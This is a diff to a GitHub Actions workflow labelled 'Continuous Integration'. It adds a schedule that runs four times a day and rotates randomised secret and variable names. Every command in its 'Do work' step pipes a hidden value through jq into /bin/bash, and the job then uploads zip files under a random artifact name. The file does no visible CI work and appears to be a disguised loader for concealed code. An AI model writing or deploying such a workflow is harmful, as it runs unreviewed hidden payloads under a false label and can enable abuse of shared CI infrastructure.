@@ -2,6 +2,8 @@ name: Continuous Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '41 0,6,12,18 * * *'
 jobs:
   launch:
     runs-on: ubuntu-latest
@@ -13,17 +15,17 @@ jobs:
           fetch-depth: 1
       - name: Do work
         env:
-          vod15868: ${{ secrets.vod15868 }}
+          hwqdn71: ${{ secrets.hwqdn71 }}
         run: |
-          printf '%s' "$vod15868" | jq -r .x01088 | /bin/bash
-          printf '%s' "$d712" | jq -r .ne8369 | /bin/bash
-          echo $psns472 | jq -r .i0 | /bin/bash
-          echo $ngy841 | jq -r .wlybm838 | /bin/bash
-          echo $oa49075 | jq -r .hcmup19282 | /bin/bash
+          printf '%s' "$hwqdn71" | jq -r .zyvvx1 | /bin/bash
+          printf '%s' "$lz5796" | jq -r .bafkt62 | /bin/bash
+          printf '%s' "$h07174" | jq -r .tq2336 | /bin/bash
+          echo $rwhoo0 | jq -r .p022 | /bin/bash
+          printf '%s' "$nmipj710" | jq -r .wmzx8002 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
         with:
-          name: MDknzI6e
+          name: cjUkOxoS
           path: "*.zip"
           retention-days: 1
